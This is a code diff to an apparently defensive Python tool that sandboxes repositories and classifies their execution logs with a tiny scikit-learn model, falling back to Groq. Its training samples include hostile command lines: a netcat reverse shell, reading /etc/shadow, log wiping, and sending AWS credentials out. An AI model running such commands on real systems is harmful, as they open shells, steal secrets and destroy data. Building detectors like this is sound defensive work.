@@ -47,9 +47,10 @@ class ReportModel(BaseModel):
 
 # 2. Setup Temporary Environment
 def prepare_environment(source_type: str, source_data: any) -> str:
-    sandbox_base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sandboxes")
-    os.makedirs(sandbox_base, exist_ok=True)
-    temp_dir = tempfile.mkdtemp(prefix="sentinel_", dir=sandbox_base)
+    # Use the system's default temporary directory instead of a local 'sandboxes' folder.
+    # This prevents Uvicorn's '--reload' watcher from detecting file changes 
+    # during sandbox creation and accidentally restarting the server.
+    temp_dir = tempfile.mkdtemp(prefix="sentinel_")
     print(f"[*] Created temp dir: {temp_dir}")
     
     if source_type == "url":
@@ -124,7 +125,77 @@ def generate_dockerfile(repo_dir: str, analysis: dict):
         f.write(dockerfile_content.strip())
         
 # 5. ML Analysis (using Groq)
+local_ml_available = False
+local_log_classifier = None
+local_log_vectorizer = None
+
+try:
+    from sklearn.feature_extraction.text import TfidfVectorizer
+    from sklearn.ensemble import RandomForestClassifier
+    import numpy as np
+    
+    # Train a simple local model for log behavioral analysis
+    training_logs = [
+        ("Starting web server on port 8080... OK\nAccepting connections...", "CLEAN"),
+        ("Loading configuration from config.yaml\nInitializing database...", "CLEAN"),
+        ("Connecting to malicious IP 192.168.1.100...\nDownloading payload.sh\nExecuting payload.sh", "MALICIOUS"),
+        ("nc -e /bin/bash 10.0.0.5 4444\nConnection established.", "MALICIOUS"),
+        ("cat /etc/shadow\nroot:$6$xyz...", "MALICIOUS"),
+        ("rm -rf /var/log/*\nLogs cleared.", "SUSPICIOUS"),
+        ("Found AWS credentials in ~/.aws/credentials\nSending to remote server...", "MALICIOUS"),
+        ("Importing requests module\nFetching data from API...", "CLEAN")
+    ]
+    
+    local_log_vectorizer = TfidfVectorizer()
+    X_train = local_log_vectorizer.fit_transform([text for text, label in training_logs])
+    y_train = [label for text, label in training_logs]
+    
+    local_log_classifier = RandomForestClassifier(n_estimators=10, random_state=42)
+    local_log_classifier.fit(X_train, y_train)
+    local_ml_available = True
+    print("[*] Local ML Model (sklearn) initialized successfully for Log Analysis.")
+except ImportError:
+    print("[!] scikit-learn not found. Local ML model disabled. Falling back to Groq AI.")
+
+def analyze_logs_with_local_ml(logs: str) -> ReportModel:
+    if not local_ml_available:
+        return None
+    try:
+        X_test = local_log_vectorizer.transform([logs])
+        proba = np.max(local_log_classifier.predict_proba(X_test))
+        pred = local_log_classifier.predict(X_test)[0]
+        
+        # Require reasonable confidence to override Groq fallback
+        if proba > 0.6:
+            risk_score = 0
+            findings = []
+            if pred == "MALICIOUS":
+                risk_score = 90
+                findings = ["Local ML detected highly malicious patterns in the logs (e.g., potential reverse shells, unauthorized access to shadow files, or data exfiltration attempts)."]
+            elif pred == "SUSPICIOUS":
+                risk_score = 50
+                findings = ["Local ML detected suspicious behavior in the execution logs."]
+            elif pred == "CLEAN":
+                risk_score = 0
+                findings = ["Execution logs appear clean based on Local ML analysis."]
+                
+            return ReportModel(status=pred, risk_score=risk_score, findings=findings)
+    except Exception as e:
+        print(f"[!] Local ML Log Analysis Error: {e}")
+    return None
+
 async def analyze_logs_with_ml(logs: str) -> ReportModel:
+    # 1. First Step: Try Local ML Model
+    if local_ml_available:
+        print("[*] Attempting to analyze logs with Local ML Model...")
+        ml_result = analyze_logs_with_local_ml(logs)
+        if ml_result:
+             print("[*] Local ML Model successfully provided an output.")
+             return ml_result
+        else:
+             print("[*] Local ML Model could not provide confident output. Falling back to Groq AI...")
+             
+    # 2. Second Step: Fallback to Groq
     if not groq_client:
         return ReportModel(status="ERROR", risk_score=0, findings=["Groq AI not configured."])
         
